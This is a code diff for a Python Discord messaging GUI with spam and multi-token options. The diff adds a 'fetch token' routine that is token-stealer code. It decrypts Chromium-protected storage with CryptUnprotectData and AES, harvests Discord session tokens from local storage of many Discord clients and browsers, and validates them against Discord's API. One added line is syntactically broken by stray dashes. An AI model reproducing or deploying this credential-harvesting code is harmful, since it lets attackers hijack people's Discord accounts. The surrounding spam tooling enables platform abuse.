@@ -1,9 +1,13 @@
+import os
+import re
+import base64
+import json
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
 import customtkinter as ctk
 import requests
 import threading
-import json
 import time
-import websocket
 import datetime 
 import tkinter as tk
 from txtstorage.txtstorage import log_messages
@@ -21,8 +25,9 @@ class DiscordMessenger(ctk.CTk):
         self.log_file = None
 
         self.use_multiple_tokens = False
+        self.auto_fetch_tokens = False
         self.title("Discord Messenger")
-        self.geometry("700x700")  # Increased window size
+        self.geometry("700x700")
         self.resizable(False, False)
         ctk.set_appearance_mode("dark")
         ctk.set_default_color_theme("blue")
@@ -55,12 +60,11 @@ class DiscordMessenger(ctk.CTk):
         )
         self.token_entry.pack(pady=(40, 10))
 
-        # Initialize the connecting token entry with placeholder text
         self.connecting_token_entry = ctk.CTkEntry(
             self.main_frame,
             placeholder_text="Enter Connecting Token (if multiple tokens enabled)",
             width=400,
-            height=40,  # Increased height
+            height=40,
             state="disabled"
         )
 
@@ -112,6 +116,15 @@ class DiscordMessenger(ctk.CTk):
             width=200
         )
         self.send_button.pack(pady=10)
+
+        self.fetch_token_button = ctk.CTkButton(
+            self.main_frame,
+            text="Fetch Token Automatically",
+            command=self.fetch_token,
+            width=200
+        )
+        self.fetch_token_button.pack(pady=10)
+
         self.connect_button = ctk.CTkButton(
             self.main_frame,
             text="Connect to Channel",
@@ -137,51 +150,32 @@ class DiscordMessenger(ctk.CTk):
         )
         self.settings_title.pack(pady=(40, 20))
 
-        self.spam_settings_frame = ctk.CTkFrame(self.settings_frame)
-        self.spam_settings_frame.pack(pady=20, padx=20, fill="x")
-
-        self.spam_var = ctk.BooleanVar(value=self.spam_enabled)
+        self.spam_var = tk.BooleanVar()
         self.spam_checkbox = ctk.CTkCheckBox(
-            self.spam_settings_frame,
-            text="Enable Message Spam",
+            self.settings_frame,
+            text="Enable Spam",
             variable=self.spam_var,
             command=self.toggle_spam_interval
         )
         self.spam_checkbox.pack(pady=10)
 
-        self.interval_frame = ctk.CTkFrame(self.spam_settings_frame)
-        self.interval_frame.pack(pady=10)
+        self.interval_label = ctk.CTkLabel(self.settings_frame, text="Spam Interval (seconds):")
+        self.interval_label.pack(pady=10)
 
-        self.interval_label = ctk.CTkLabel(
-            self.interval_frame,
-            text="Spam Interval (seconds):"
-        )
-        self.interval_label.pack(side="left", padx=5)
+        self.interval_entry = ctk.CTkEntry(self.settings_frame, width=200)
+        self.interval_entry.pack(pady=10)
+        self.interval_entry.insert(0, "5")
 
-        self.interval_entry = ctk.CTkEntry(
-            self.interval_frame,
-            width=100,
-            state="disabled"
-        )
-        self.interval_entry.pack(side="left", padx=5)
-        self.interval_entry.insert(0, str(self.spam_interval))
-
-        self.separator = ctk.CTkFrame(self.settings_frame, height=2)
-        self.separator.pack(fill='x', pady=20, padx=20)
-
-        self.logging_frame = ctk.CTkFrame(self.settings_frame)
-        self.logging_frame.pack(pady=20, padx=20, fill="x")
-
-        self.logging_var = ctk.BooleanVar(value=self.logging_enabled)
+        self.logging_var = tk.BooleanVar()
         self.logging_checkbox = ctk.CTkCheckBox(
-            self.logging_frame,
-            text="Enable Message History Logging",
+            self.settings_frame,
+            text="Enable Logging",
             variable=self.logging_var,
             command=self.toggle_logging
         )
         self.logging_checkbox.pack(pady=10)
 
-        self.multiple_tokens_var = ctk.BooleanVar(value=self.use_multiple_tokens)
+        self.multiple_tokens_var = tk.BooleanVar()
         self.multiple_tokens_checkbox = ctk.CTkCheckBox(
             self.settings_frame,
             text="Use Multiple Tokens",
@@ -190,17 +184,136 @@ class DiscordMessenger(ctk.CTk):
         )
         self.multiple_tokens_checkbox.pack(pady=10)
 
+        self.connecting_token_entry = ctk.CTkEntry(
+            self.settings_frame,
+            placeholder_text="Enter Connecting Token",
+            width=400,
+            height=40,
+            state="disabled"
+        )
+        self.connecting_token_entry.pack(pady=10)
+
+    def fetch(self):
+        """[[token, user#tag], ...] """
+        
+        regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
+        encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
+        
+        def decrypt_stuff(buff, master_key) -> str:
+            try:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_stuff = cipher.decrypt(payload)
+                decrypted_stuff = decrypted_stuff[:-16].decode()
+                
+                return decrypted_stuff
+            except Exception:
+                pass
+        
+        def get_decryption_key(path) -> str:
+            with open(path, "r", encoding="utf-8") as f:
+                temp = f.read()
+            local = json.loads(temp)
+            decryption_key = base64.b64decode(local["os_crypt"]["encrypted_key"])
+            decryption_key = decryption_key[5:]
+            decryption_key = CryptUnprotectData(decryption_key, None, None, None, 0)[1]
+            
+            return decryption_key
+        
+        def check_token(tkn, name, ids:list, to_return_tokens:list):
+            r = requests.get("https://discord.com/api/v9/users/@me", headers={
+                'Authorization': tkn,
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0'
+            })
+            if r.status_code == 200:
+                tknid = base64.b64decode((tkn.split('.')[0] + '===').encode('ascii')).decode('ascii')
+                if (tknid + name) not in ids:
+                    to_return_tokens.append([tkn, f"{r.json()['username']}#{r.json()['discriminator']}", tknid, name])
+                    ids.append(tknid + name)
+
+            return ids, to_return_tokens
+        
+        to_return_tokens = []
+        ids = []
+
+        roaming = os.getenv("appdata")
+        localappdata = os.getenv("localappdata")
+
+        paths = {
+            'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': localappdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': localappdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': localappdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': localappdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': localappdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': localappdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': localappdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': localappdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': localappdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': localappdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': localappdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': localappdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Uran': localappdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': localappdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': localappdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': localappdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
+        for name, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            disc = name.replace(" ", "").lower()
+            if "cord" in path:
+                if os.path.exists(roaming + f'\\{disc}\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in re.findall(encrypted_regex, line):
+                                try:
+                                    token = decrypt_stuff(base64.b64decode(
+                                        y.split('dQw4w9WgXcQ:')[1]), get_decryption_key(roaming + f'\\{disc}\\Local State'))
+                                except: 
+                                    pass
+                                else:
+                                    ids, to_return_tokens = check_token(token, name, ids, to_return_tokens)
+            else:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for reg in (regex):
+                            for token in re.findall(reg, line):
+                                ids, to_return_tokens = check_token(token, name, ids, to_return_tokens)
+                
+        return to_return_tokens
+
+    def fetch_token(self):
+        tokens = self.fetch()
+        if tokens:
+            self.token_entry.delete(0, tk.END)
+            self.token_entry.insert(0, tokens[0][0])------
+            self.add_message_to_display("Token fetched successfully!")
+        else:
+            self.add_message_to_display("No tokens found.")
+
     def toggle_multiple_tokens(self):
         self.use_multiple_tokens = self.multiple_tokens_var.get()
         if self.use_multiple_tokens:
-            self.connecting_token_entry.pack(pady=(10, 10))  # Show the connecting token entry
-            self.connecting_token_entry.configure(state="normal")  # Enable the entry
-            self.token_entry.configure(placeholder_text="Enter Discord Token(s), separated by commas")  # Update placeholder
+            self.connecting_token_entry.pack(pady=(10, 10))
+            self.connecting_token_entry.configure(state="normal")
+            self.token_entry.configure(placeholder_text="Enter Discord Token(s), separated by commas")
         else:
-            self.connecting_token_entry.pack_forget()  # Remove the entry from the layout
-            self.connecting_token_entry.configure(state="disabled")  # Disable the entry
-            self.connecting_token_entry.delete(0, "end")  # Clear the entry if disabled
-            self.token_entry.configure(placeholder_text="Enter Discord Token")  # Update placeholder
+            self.connecting_token_entry.pack_forget()
+            self.connecting_token_entry.configure(state="disabled")
+            self.connecting_token_entry.delete(0, "end")
+            self.token_entry.configure(placeholder_text="Enter Discord Token")
 
     def show_main_page(self):
         self.settings_frame.pack_forget()
